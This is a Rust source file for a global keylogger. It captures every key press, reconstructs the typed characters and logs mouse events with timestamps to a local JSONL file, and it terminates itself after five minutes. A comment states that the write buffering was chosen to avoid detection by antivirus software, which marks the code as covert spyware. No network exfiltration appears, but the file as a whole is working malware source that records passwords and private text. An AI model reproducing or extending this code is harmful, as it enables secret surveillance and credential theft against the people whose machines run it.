//!
//! Creation Time: 2025-12-08
//! Description: Logger for keyboard and mouse input events, saving them to a JSONL file with timestamps.
//!              You can customize the params of the program by ways you like, 
//!              such as: 
//!              1.changing the place to log the data
//!              2.changing the buffer size(which is in the """struct InputLogger""")
//!              3.changing the time to automatically terminate the program(which is in the """main function""").

use chrono::Local;
use rdev::{listen, Event, EventType, Key};
use serde::{Deserialize, Serialize};
use serde_json;
use std::fs::{File, OpenOptions};
use std::io::{BufWriter, Write};
use std::process::{self, Command};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, SystemTime};

#[derive(Serialize, Deserialize, Clone)]
enum InputEvent {
    KeyPress(String),
    KeyRelease(String),
    CharInput(String),
    ButtonPress(String),
    ButtonRelease(String),
    MouseMove { x: f64, y: f64 },
    Wheel { delta_x: i64, delta_y: i64 },
}

#[derive(Serialize, Deserialize, Clone)]
struct TimedEvent {
    timestamp: u64,
    event: InputEvent,
}

impl TimedEvent {
    fn now(event: InputEvent) -> Self {
        let timestamp: u64 = SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)
            .unwrap()
            .as_millis() as u64;
        TimedEvent { timestamp, event }
    }

    fn format_timestamp(&self) -> String {
        let ts: i64 = self.timestamp as i64;

        let secs: i64 = ts / 1000;
        let nanos: u32 = (ts % 1000) as u32 * 1_000_000;

        let dt_utc: chrono::DateTime<chrono::Utc> = chrono::DateTime::<chrono::Utc>::from_timestamp(secs, nanos)
            .unwrap_or_else(|| {
                Command::new("taskkill")
                    .args(&["/PID", &process::id().to_string(), "/F"])
                    .spawn()
                    .unwrap();
                
                // actually the program will not get here
                // but method unwrap_or_else requires a return value
                chrono::DateTime::<chrono::Utc>::from_timestamp(0, 0).unwrap()
            });



        // convert to local timezone (which is based on the computer where the program is running)
        let dt_local: chrono::DateTime<Local> = dt_utc.with_timezone(&chrono::Local);

        dt_local.format("%Y-%m-%d %H:%M:%S%.3f %:z").to_string()
    }

}

/// Basic key to character conversion , considering Shift, Whitespace, Tab and CapsLock states.
fn key_to_char(key: Key, shift: bool, caps: bool) -> Option<String> {
    let base: char = match key {
        Key::KeyA => 'a', Key::KeyB => 'b', Key::KeyC => 'c', Key::KeyD => 'd',
        Key::KeyE => 'e', Key::KeyF => 'f', Key::KeyG => 'g', Key::KeyH => 'h',
        Key::KeyI => 'i', Key::KeyJ => 'j', Key::KeyK => 'k', Key::KeyL => 'l',
        Key::KeyM => 'm', Key::KeyN => 'n', Key::KeyO => 'o', Key::KeyP => 'p',
        Key::KeyQ => 'q', Key::KeyR => 'r', Key::KeyS => 's', Key::KeyT => 't',
        Key::KeyU => 'u', Key::KeyV => 'v', Key::KeyW => 'w', Key::KeyX => 'x',
        Key::KeyY => 'y', Key::KeyZ => 'z',
        _ => return match key {
            Key::Num1 => Some(if shift { "!" } else { "1" }.to_string()),
            Key::Num2 => Some(if shift { "@" } else { "2" }.to_string()),
            Key::Num3 => Some(if shift { "#" } else { "3" }.to_string()),
            Key::Num4 => Some(if shift { "$" } else { "4" }.to_string()),
            Key::Num5 => Some(if shift { "%" } else { "5" }.to_string()),
            Key::Num6 => Some(if shift { "^" } else { "6" }.to_string()),
            Key::Num7 => Some(if shift { "&" } else { "7" }.to_string()),
            Key::Num8 => Some(if shift { "*" } else { "8" }.to_string()),
            Key::Num9 => Some(if shift { "(" } else { "9" }.to_string()),
            Key::Num0 => Some(if shift { ")" } else { "0" }.to_string()),
            Key::Space => Some(" ".to_string()),
            Key::Return => Some("\n".to_string()),
            Key::Tab => Some("\t".to_string()),
            _ => None,
        },
    };

    let is_upper: bool = shift ^ caps;
    Some(if is_upper { base.to_ascii_uppercase().to_string() } else { base.to_string() })
}

/// Logger that writes input events to a JSONL file.
struct InputLogger {
    file: BufWriter<File>,
    events: Vec<TimedEvent>,
    max_events_in_memory: usize,
}

impl InputLogger {
    fn new(filename: &str) -> std::io::Result<Self> {
        let file = OpenOptions::new().create(true).append(true).open(filename)?;
        Ok(InputLogger {
            file: BufWriter::new(file),
            events: Vec::new(),
            max_events_in_memory: 100, 
            // Flush after 100 events in memory, I set it to 100 by which I wanna reduce the disk I/O activity to avoid detection by antivirus software
        })
    }

    fn log_event(&mut self, event: TimedEvent) -> std::io::Result<()> {
        self.events.push(event);
        if self.events.len() >= self.max_events_in_memory {
            self.flush()?;
        }
        Ok(())
    }

    fn flush(&mut self) -> std::io::Result<()> {
        for event in &self.events {
            let formatted: serde_json::Value = serde_json::json!({
                "timestamp": event.format_timestamp(),
                "event": &event.event
            });

            writeln!(self.file, "{}", formatted.to_string())?;
        }
        self.file.flush()?;
        self.events.clear();
        Ok(())
    }

}

fn main() {
    let pid: u32 = process::id();
    let filename: String = format!("log_{}.jsonl", Local::now().format("%Y%m%d_%H%M%S"));
    
    // The process will automatically terminate after 5 minutes
    thread::spawn(move || {
        thread::sleep(Duration::from_secs(5 * 60));
        Command::new("taskkill")
            .args(&["/PID", &pid.to_string(), "/F"])
            .spawn()
            .unwrap();
    });

    let logger: InputLogger = InputLogger::new(&filename).unwrap();
    let logger_arc: Arc<Mutex<InputLogger>> = Arc::new(Mutex::new(logger));

    let shift_state: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
    let caps_state: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));

    let callback = move |event: Event| {
        let et: &EventType = &event.event_type;

        match et {
            EventType::KeyPress(Key::ShiftLeft) | EventType::KeyPress(Key::ShiftRight) => {
                *shift_state.lock().unwrap() = true;
            }
            EventType::KeyRelease(Key::ShiftLeft) | EventType::KeyRelease(Key::ShiftRight) => {
                *shift_state.lock().unwrap() = false;
            }
            EventType::KeyPress(Key::CapsLock) => {
                let mut caps: std::sync::MutexGuard<'_, bool> = caps_state.lock().unwrap();
                *caps = !*caps;
            }
            _ => {}
        }

        if let EventType::KeyPress(key) = et {
            let shift: bool = *shift_state.lock().unwrap();
            let caps: bool = *caps_state.lock().unwrap();
            if let Some(ch) = key_to_char(*key, shift, caps) {
                if let Ok(mut logger) = logger_arc.lock() {
                    logger.log_event(TimedEvent::now(InputEvent::CharInput(ch))).ok();
                }
            }
        }

        let timed: TimedEvent = match et {
            EventType::KeyPress(k) => TimedEvent::now(InputEvent::KeyPress(format!("{:?}", k))),
            EventType::KeyRelease(k) => TimedEvent::now(InputEvent::KeyRelease(format!("{:?}", k))),
            EventType::ButtonPress(b) => TimedEvent::now(InputEvent::ButtonPress(format!("{:?}", b))),
            EventType::ButtonRelease(b) => TimedEvent::now(InputEvent::ButtonRelease(format!("{:?}", b))),
            EventType::MouseMove { x, y } => TimedEvent::now(InputEvent::MouseMove { x: *x, y: *y }),
            EventType::Wheel { delta_x, delta_y } => TimedEvent::now(InputEvent::Wheel { delta_x: *delta_x, delta_y: *delta_y }),
        };

        if let Ok(mut logger) = logger_arc.lock() {
            logger.log_event(timed).ok();
        }
    };

    if let Err(_) = listen(callback) {
        Command::new("taskkill")
            .args(&["/PID", &pid.to_string(), "/F"])
            .spawn()
            .unwrap();
    }
}
